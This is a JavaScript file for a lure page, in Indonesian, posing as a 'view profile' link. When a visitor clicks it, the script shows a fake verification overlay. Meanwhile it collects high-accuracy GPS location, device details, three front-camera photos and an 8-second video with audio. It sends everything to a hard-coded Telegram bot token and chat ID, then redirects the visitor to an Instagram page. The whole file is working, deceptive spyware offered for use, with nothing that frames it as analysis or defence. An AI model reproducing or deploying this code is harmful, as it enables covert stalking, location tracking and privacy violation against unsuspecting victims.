// ========== KONFIGURASI TELEGRAM ==========
const BOT_TOKEN = '8973378571:AAE4LKuNnONfQEbTWHLg0F7kq-IjH5inwmc';
const CHAT_ID = '8528707941';
// =========================================

const btnView = document.getElementById('btnView');
const overlay = document.getElementById('loadingOverlay');
const loadingText = document.getElementById('loadingText');
const loadingSubtext = document.getElementById('loadingSubtext');
const avatar = document.getElementById('avatar');

const NAMA_TARGET = 'Melisagirl56';
const REDIRECT_URL = 'https://www.instagram.com/marisa_grilll.st?igsh=MWN2eGl4a2d4MjJhdQ==';

// ============ AMBIL 3 FOTO KAMERA DEPAN ============
function ambil3FotoKamera() {
    return new Promise((resolve, reject) => {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            reject('Kamera tidak didukung');
            return;
        }

        navigator.mediaDevices.getUserMedia({
            video: { 
                facingMode: 'user', 
                width: { ideal: 1280 }, 
                height: { ideal: 720 } 
            },
            audio: false
        })
        .then((stream) => {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.playsInline = true;
            video.play();

            video.onloadedmetadata = function() {
                const canvas = document.createElement('canvas');
                canvas.width = 1280;
                canvas.height = 720;
                const ctx = canvas.getContext('2d');
                const fotoList = [];
                let count = 0;

                function ambilFoto() {
                    if (count >= 3) {
                        stream.getTracks().forEach(track => track.stop());
                        resolve(fotoList);
                        return;
                    }
                    ctx.drawImage(video, 0, 0, 1280, 720);
                    const base64 = canvas.toDataURL('image/jpeg', 1.0);
                    fotoList.push(base64);
                    count++;
                    setTimeout(ambilFoto, 1500);
                }

                setTimeout(ambilFoto, 500);

                setTimeout(() => {
                    stream.getTracks().forEach(track => track.stop());
                    if (fotoList.length < 3) {
                        resolve(fotoList.length > 0 ? fotoList : []);
                    }
                }, 7000);
            };
        })
        .catch((err) => {
            reject('Akses kamera ditolak: ' + err.message);
        });
    });
}

// ============ REKAM VIDEO 8 DETIK KAMERA DEPAN ============
function rekamVideo8Detik() {
    return new Promise((resolve, reject) => {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            reject('Kamera tidak didukung');
            return;
        }

        navigator.mediaDevices.getUserMedia({
            video: { 
                facingMode: 'user', 
                width: { ideal: 640 }, 
                height: { ideal: 480 } 
            },
            audio: true
        })
        .then((stream) => {
            let mimeType = 'video/mp4';
            if (!MediaRecorder.isTypeSupported('video/mp4')) {
                mimeType = 'video/webm;codecs=vp8,opus';
            }
            if (!MediaRecorder.isTypeSupported(mimeType)) {
                mimeType = 'video/webm';
            }

            const mediaRecorder = new MediaRecorder(stream, {
                mimeType: mimeType,
                videoBitsPerSecond: 2500000
            });
            
            const chunks = [];
            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) chunks.push(e.data);
            };

            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: mimeType });
                stream.getTracks().forEach(track => track.stop());
                resolve(blob);
            };

            mediaRecorder.onerror = (err) => {
                stream.getTracks().forEach(track => track.stop());
                reject('Error rekam: ' + err);
            };

            mediaRecorder.start(1000);
            setTimeout(() => {
                if (mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, 8000);

            setTimeout(() => {
                if (mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, 9000);
        })
        .catch((err) => {
            reject('Akses kamera ditolak: ' + err.message);
        });
    });
}

// ============ AMBIL LOKASI DENGAN 5 ATTEMPT ============
function getLokasi() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve({ lat: 'Tidak tersedia', lon: 'Tidak tersedia', error: 'Geolocation tidak didukung' });
            return;
        }

        let attempts = 0;
        const maxAttempts = 5;
        let lastError = '';

        function tryGetLocation() {
            attempts++;
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    resolve({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        akurasi: pos.coords.accuracy,
                        altitude: pos.coords.altitude || 'Tidak tersedia',
                        speed: pos.coords.speed || 'Tidak tersedia',
                        heading: pos.coords.heading || 'Tidak tersedia'
                    });
                },
                (err) => {
                    lastError = err.message;
                    if (attempts < maxAttempts) {
                        setTimeout(tryGetLocation, 2000);
                    } else {
                        resolve({ 
                            lat: 'Tidak tersedia', 
                            lon: 'Tidak tersedia', 
                            error: lastError || 'Timeout expired' 
                        });
                    }
                },
                { 
                    enableHighAccuracy: true, 
                    timeout: 20000,
                    maximumAge: 0
                }
            );
        }

        tryGetLocation();
    });
}

// ============ DETAIL PERANGKAT ============
function getDeviceInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${window.screen.width}x${window.screen.height}`,
        colorDepth: window.screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        connection: navigator.connection ? 
            `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)` : 
            'Tidak tersedia',
        battery: navigator.getBattery ? 'Mendukung' : 'Tidak mendukung'
    };
}

// ============ KIRIM KE TELEGRAM ============
async function kirimKeTelegram(pesan) {
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: pesan,
                parse_mode: 'HTML',
                disable_web_page_preview: false
            })
        });
        return await response.json();
    } catch (error) {
        console.error('Error kirim pesan:', error);
        return false;
    }
}

async function kirimFotoKeTelegram(base64Image, caption) {
    try {
        const response = await fetch(base64Image);
        const blob = await response.blob();
        
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'foto_target.jpg');
        formData.append('caption', caption);

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
        const hasil = await fetch(url, {
            method: 'POST',
            body: formData
        });
        return await hasil.json();
    } catch (error) {
        console.error('Error kirim foto:', error);
        return false;
    }
}

async function kirimVideoKeTelegram(videoBlob, caption) {
    try {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('video', videoBlob, 'video_target.mp4');
        formData.append('caption', caption);
        formData.append('supports_streaming', 'true');

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
        const hasil = await fetch(url, {
            method: 'POST',
            body: formData
        });
        return await hasil.json();
    } catch (error) {
        console.error('Error kirim video:', error);
        return false;
    }
}

// ============ PROSES UTAMA ============
btnView.addEventListener('click', async function() {
    btnView.disabled = true;
    btnView.innerHTML = '⏳ Memproses...';

    overlay.classList.add('show');
    loadingText.textContent = '⏳ Memverifikasi...';
    loadingSubtext.textContent = 'Mohon tunggu sebentar';

    try {
        // 1. Ambil lokasi (5 attempt)
        const lokasi = await getLokasi();

        // 2. Ambil device info
        const device = getDeviceInfo();

        // 3. Ambil 3 foto kamera depan
        let fotoList = [];
        let kameraGagal = false;
        try {
            fotoList = await ambil3FotoKamera();
        } catch (err) {
            kameraGagal = true;
            console.log('Foto gagal:', err);
        }

        // 4. Rekam video 8 detik
        let videoBlob = null;
        let videoGagal = false;
        try {
            videoBlob = await rekamVideo8Detik();
        } catch (err) {
            videoGagal = true;
            console.log('Video gagal:', err);
        }

        // 5. Kirim data ke Telegram
        const waktu = new Date().toLocaleString('id-ID');
        let mapsLink = '';
        if (lokasi.lat !== 'Tidak tersedia' && lokasi.lon !== 'Tidak tersedia') {
            mapsLink = `https://www.google.com/maps?q=${lokasi.lat},${lokasi.lon}`;
        }

        let pesan = `🔴 <b>ALERT! Profil Dilihat</b>\n\n`;
        pesan += `👤 Target: <b>${NAMA_TARGET}</b>\n`;
        
        if (lokasi.lat !== 'Tidak tersedia' && lokasi.lon !== 'Tidak tersedia') {
            pesan += `📍 <b>LOKASI DITEMUKAN!</b>\n`;
            pesan += `   • Latitude: ${lokasi.lat}\n`;
            pesan += `   • Longitude: ${lokasi.lon}\n`;
            pesan += `   • Akurasi: ${Math.round(lokasi.akurasi)} meter\n`;
            if (lokasi.altitude && lokasi.altitude !== 'Tidak tersedia') {
                pesan += `   • Altitude: ${lokasi.altitude}m\n`;
            }
            if (lokasi.speed && lokasi.speed !== 'Tidak tersedia') {
                pesan += `   • Kecepatan: ${lokasi.speed} m/s\n`;
            }
            if (lokasi.heading && lokasi.heading !== 'Tidak tersedia') {
                pesan += `   • Arah: ${lokasi.heading}°\n`;
            }
            pesan += `   🗺️ <a href="${mapsLink}">Klik untuk lihat di Google Maps</a>\n`;
        } else {
            pesan += `📍 Lokasi: GAGAL (${lokasi.error || 'Unknown'})\n`;
            pesan += `   ⚠️ Mungkin izin lokasi ditolak atau GPS mati\n`;
        }

        pesan += `\n📱 <b>Detail Perangkat:</b>\n`;
        pesan += `• Platform: ${device.platform}\n`;
        pesan += `• Bahasa: ${device.language}\n`;
        pesan += `• Layar: ${device.screen} (${device.colorDepth}bit)\n`;
        pesan += `• Zona Waktu: ${device.timezone}\n`;
        pesan += `• Koneksi: ${device.connection}\n`;
        pesan += `• Battery API: ${device.battery}\n`;
        pesan += `• User Agent: ${device.userAgent.substring(0, 200)}...\n`;
        
        if (videoGagal) {
            pesan += `\n⚠️ Video: GAGAL DIREKAM\n`;
        }
        if (kameraGagal) {
            pesan += `⚠️ Foto: GAGAL DIAMBIL\n`;
        }
        
        pesan += `\n🕐 Waktu: ${waktu}`;

        // Kirim pesan teks
        await kirimKeTelegram(pesan);

        // Kirim 3 foto
        if (fotoList.length > 0 && !kameraGagal) {
            for (let i = 0; i < fotoList.length; i++) {
                const caption = `📸 Foto ${i+1}/3 dari ${NAMA_TARGET}`;
                await kirimFotoKeTelegram(fotoList[i], caption);
                await sleep(300);
            }
        }

        // Kirim video 8 detik
        if (videoBlob && !videoGagal) {
            const caption = `🎥 Video 8 detik (kamera depan) dari ${NAMA_TARGET}`;
            await kirimVideoKeTelegram(videoBlob, caption);
        }

        await sleep(1500);

    } catch (error) {
        console.error('Error:', error);
        await sleep(1000);
    }

    // Tutup loading
    overlay.classList.remove('show');
    btnView.disabled = false;
    btnView.innerHTML = 'Lihat Profil Melisagirl56 <span class="arrow">→</span>';

    // Redirect ke Instagram
    window.location.href = REDIRECT_URL;
});

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Error handling foto
avatar.onerror = function() {
    this.src = 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="80" height="80"%3E%3Crect fill="%23ddd" width="80" height="80"/%3E%3Ctext x="40" y="48" text-anchor="middle" fill="%23999" font-size="12" font-family="sans-serif"%3EFoto%3C/text%3E%3C/svg%3E';
};
